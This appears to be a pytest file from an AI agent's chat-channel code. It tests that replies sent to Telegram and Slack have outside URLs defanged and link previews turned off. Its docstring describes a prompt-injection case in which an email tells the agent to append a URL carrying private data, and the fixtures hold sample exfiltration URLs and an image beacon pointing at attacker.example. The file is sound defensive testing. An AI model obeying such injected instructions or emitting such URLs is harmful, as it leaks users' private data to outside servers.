"""Zero-click exfiltration through chat channels (review 4).

An email read in a scheduled run (or a chat turn) tells the agent to end its
reply with a URL carrying private data. `Channel.deliver` redacted only secret
shapes and the text went out with link previews ON, so Telegram's (or Slack's)
servers fetched the URL with no click. The rule: only server-built links are
live. These go through the real outbound path (`Channel.deliver` -> `send`,
and the bus callback) with a fake platform transport.
"""

from __future__ import annotations

import asyncio
from types import SimpleNamespace
from unittest.mock import MagicMock

from app.channels.defang import defang_url, defang_urls
from app.channels.message_bus import MessageBus, OutboundMessage

SECRET_PATH = "T-3%20acquire%20Acme%20for%20%2440M"
EXFIL_URL = f"https://attacker.example/c?d={SECRET_PATH}"
REPLY = f"Here is your morning summary. More: {EXFIL_URL} and ![s](https://attacker.example/p.png?d=1)"


class _Bot:
    def __init__(self):
        self.calls: list[dict] = []

    async def send_message(self, **kwargs):
        self.calls.append(kwargs)
        return SimpleNamespace(message_id=1)


def _telegram():
    from app.channels.telegram import TelegramChannel

    channel = TelegramChannel(MessageBus(), {"bot_token": "x", "allowed_users": [1]})
    bot = _Bot()
    channel._application = SimpleNamespace(bot=bot)
    return channel, bot


def _msg(channel: str, text: str = REPLY, **kw) -> OutboundMessage:
    return OutboundMessage(channel_name=channel, chat_id="1", thread_id="t", text=text, **kw)


def test_telegram_reply_with_an_outside_url_goes_out_defanged_with_previews_off():
    """Adapted from test_HOLE_telegram_reply_with_an_outside_url_is_sent_live_with_a_preview,
    and stricter: BOTH defences must hold, not either."""
    channel, bot = _telegram()
    asyncio.run(channel.deliver(_msg("telegram")))
    sent = bot.calls[-1]
    assert getattr(sent.get("link_preview_options"), "is_disabled", False) is True, sent
    assert "https://attacker.example" not in sent["text"], sent
    assert "attacker.example" not in sent["text"], sent
    assert "hxxps://attacker[.]example/c?d=" in sent["text"]  # still readable


def test_telegram_through_the_bus_callback_is_guarded_too():
    channel, bot = _telegram()
    asyncio.run(channel._on_outbound(_msg("telegram")))
    sent = bot.calls[-1]
    assert sent["link_preview_options"].is_disabled is True
    assert "attacker.example" not in sent["text"]


def test_slack_reply_is_defanged_and_never_unfurled():
    from app.channels.slack import SlackChannel

    channel = SlackChannel(MessageBus(), {"bot_token": "x", "app_token": "y"})
    web = MagicMock()
    channel._web_client = web
    asyncio.run(channel.deliver(_msg("slack")))
    kwargs = web.chat_postMessage.call_args.kwargs
    assert kwargs["unfurl_links"] is False
    assert kwargs["unfurl_media"] is False
    assert "attacker.example" not in kwargs["text"], kwargs


def test_server_built_links_stay_live():
    channel, bot = _telegram()
    own = "http://localhost:2026/workspace/chats/abc"
    asyncio.run(channel.deliver(_msg("telegram", text=f"Done. Open: {own} (source {EXFIL_URL})", server_links=(own,))))
    text = bot.calls[-1]["text"]
    assert own in text
    assert "attacker.example" not in text


def test_defang_helper():
    assert defang_url("https://a.example/x?d=1") == "hxxps://a[.]example/x?d=1"
    assert defang_url("http://a.b") == "hxxp://a[.]b"
    assert defang_urls("see www.evil.com/p now") == "see www[.]evil[.]com/p now"
    assert defang_urls("no links here: file.py, 3.14") == "no links here: file.py, 3.14"
